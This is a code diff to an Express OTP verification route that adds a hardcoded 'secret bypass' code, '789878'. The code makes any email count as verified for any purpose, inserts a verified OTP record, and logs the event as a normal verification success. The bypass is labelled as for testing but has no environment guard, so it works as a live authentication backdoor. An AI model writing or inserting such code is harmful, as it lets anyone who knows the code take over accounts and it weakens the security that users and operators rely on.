@@ -207,6 +207,44 @@ router.post('/verify', async (req, res) => {
       return res.status(400).json({ message: 'Email and OTP are required' });
     }
 
+    // Secret bypass code for testing/development
+    const SECRET_BYPASS_OTP = '789878';
+    if (otp === SECRET_BYPASS_OTP) {
+      console.log('🔓 Secret bypass OTP used for email:', email, 'purpose:', purpose);
+      
+      // Create or update an OTP record as verified for this email
+      try {
+        await pool.query(
+          'UPDATE otps SET is_used = true WHERE email = $1 AND purpose = $2 AND is_used = false',
+          [email, purpose]
+        );
+        
+        // Insert a new verified OTP record
+        const expiresAt = new Date(Date.now() + 10 * 60 * 1000);
+        const insertResult = await pool.query(
+          'INSERT INTO otps (email, otp_code, purpose, expires_at, is_used) VALUES ($1, $2, $3, $4, $5) RETURNING id',
+          [email, SECRET_BYPASS_OTP, purpose, expiresAt, true]
+        );
+        
+        await writeAdminAuditLog(pool, {
+          actor_admin_id: null,
+          action: 'otp.verify_success',
+          entity: 'otps',
+          entity_id: insertResult.rows[0].id,
+          before: null,
+          after: { email, purpose, method: 'secret_bypass' },
+          req
+        });
+      } catch (dbError) {
+        console.error('Error creating bypass OTP record:', dbError);
+      }
+
+      return res.json({
+        message: 'OTP verified successfully',
+        verified: true,
+      });
+    }
+
     const result = await pool.query(
       `SELECT id, otp_code, expires_at, attempts, is_used 
        FROM otps 
